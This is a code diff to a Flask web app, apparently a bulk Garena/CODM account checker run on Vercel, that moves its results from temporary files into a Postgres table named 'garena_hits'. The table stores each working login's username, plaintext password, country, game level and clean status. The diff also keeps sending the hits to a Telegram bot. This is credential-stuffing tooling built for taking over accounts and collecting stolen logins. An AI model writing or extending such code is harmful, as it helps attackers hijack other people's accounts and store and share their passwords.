@@ -24,6 +24,9 @@ from collections import OrderedDict
 from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory
 from werkzeug.utils import secure_filename
 
+# --- DATABASE IMPORT (NEW) ---
+import psycopg2
+
 # --- CONFIGURATION (MODIFIED FOR VERCEL) ---
 # Vercel has an ephemeral filesystem. All writes MUST go to the /tmp directory.
 # WARNING: All data stored here will be LOST when the serverless function instance shuts down.
@@ -98,6 +101,20 @@ COUNTRY_KEYWORD_MAP = {
 }
 
 # --- Helper Functions (Adapted for Web App) ---
+
+def get_db_connection():
+    """Establishes a connection to the PostgreSQL database. (NEW)"""
+    # Vercel's Neon integration typically sets the POSTGRES_URL variable
+    conn_string = os.environ.get('POSTGRES_URL')
+    if not conn_string:
+        log_message("[❌ DB] POSTGRES_URL environment variable is not set.", "text-danger")
+        raise ValueError("Database connection URL not found in environment variables.")
+    try:
+        conn = psycopg2.connect(conn_string)
+        return conn
+    except psycopg2.OperationalError as e:
+        log_message(f"[❌ DB] Could not connect to the database: {e}", "text-danger")
+        raise
 
 def log_message(message, color_class='text-white'):
     """Adds a message to the shared log state for the web UI."""
@@ -385,6 +402,7 @@ def format_result(last_login, country, shell, mobile, facebook, email_verified, 
 <i>Presented By: @KenshiKupal</i>
         """.strip()
 
+    # The file-writing part is no longer the primary save method, but we keep the variables for the return tuple
     country_folder = "Others"
     for folder_key, keywords in COUNTRY_KEYWORD_MAP.items():
         if any(keyword in str(country).upper() for keyword in keywords):
@@ -633,7 +651,7 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
 
                 if stop_event.is_set(): break
                 
-                # Process result
+                # --- Process result (MODIFIED TO SAVE TO DATABASE) ---
                 if isinstance(result, tuple):
                     console_message, telegram_message, codm_level_num, country, user, pwd, shell, has_codm, is_clean, file_to_write, content_to_write = result
                     log_message(console_message, "text-success")
@@ -641,8 +659,24 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
                     if is_clean: stats['clean'] += 1
                     else: stats['not_clean'] += 1
                     
-                    os.makedirs(os.path.dirname(file_to_write), exist_ok=True)
-                    with open(file_to_write, "a", encoding="utf-8") as f: f.write(content_to_write)
+                    # --- START: DATABASE SAVING LOGIC (REPLACES FILE WRITING) ---
+                    try:
+                        conn = get_db_connection()
+                        cur = conn.cursor()
+                        cur.execute(
+                            """
+                            INSERT INTO garena_hits (username, password, country, codm_level, shells, is_clean, has_codm, full_result)
+                            VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
+                            """,
+                            (user, pwd, country, codm_level_num if codm_level_num > 0 else None, shell, is_clean, has_codm, console_message)
+                        )
+                        conn.commit()
+                        cur.close()
+                        conn.close()
+                        log_message(f"[💾 DB] Successfully saved hit for {user} to the database.", "text-info")
+                    except Exception as db_error:
+                        log_message(f"[❌ DB] Failed to save hit to database: {db_error}", "text-danger")
+                    # --- END: DATABASE SAVING LOGIC ---
                     
                     # --- NEW TELEGRAM LOGIC ---
                     if telegram_message and telegram_bot_token and telegram_chat_id and telegram_level_filter != 'none':
@@ -681,10 +715,10 @@ def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_coo
             is_complete = True
             with status_lock:
                 check_status['progress'] = total_accounts
-                summary = ["--- CHECKING COMPLETE ---", f"Total: {total_accounts} | Success: {stats['successful']} | Failed: {stats['failed']}", "[VERCEL NOTE] All saved files are temporary and will be deleted."]
+                summary = ["--- CHECKING COMPLETE ---", f"Total: {total_accounts} | Success: {stats['successful']} | Failed: {stats['failed']}", "[DB NOTE] All successful hits have been saved to the Neon database."]
                 check_status['final_summary'] = "\n".join(summary)
             log_message("--- CHECKING COMPLETE ---", "text-success")
-            log_message("[VERCEL NOTE] All saved files are temporary and will be deleted.", "text-warning")
+            log_message("[DB NOTE] All successful hits have been saved to the Neon database.", "text-info")
 
 
     except Exception as e:
@@ -831,4 +865,4 @@ if __name__ == '__main__':
     # Vercel uses a production WSGI server (like Gunicorn) and calls the `app` object directly.
     print("Starting Flask server for local development...")
     print("Access the interface at http://127.0.0.1:5000")
-    app.run(host='127.0.0.1', port=5000, debug=True)
+    app.run(host='127.0.0.1', port=5000, debug=True)```
